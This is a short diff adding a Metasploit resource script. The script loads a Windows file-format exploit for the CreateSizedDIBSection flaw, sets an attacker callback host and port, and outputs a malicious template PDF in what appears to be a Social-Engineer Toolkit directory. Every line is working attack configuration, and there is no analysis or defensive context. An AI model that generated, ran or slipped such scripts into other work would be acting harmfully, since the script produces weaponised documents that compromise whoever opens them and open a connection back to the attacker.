@@ -1,0 +1,5 @@
+use exploit/windows/fileformat/ms11_006_createsizeddibsection
+set LHOST 172.23.102.95
+set LPORT 100
+set FILENAME /root/.set/template.pdf
+exploit
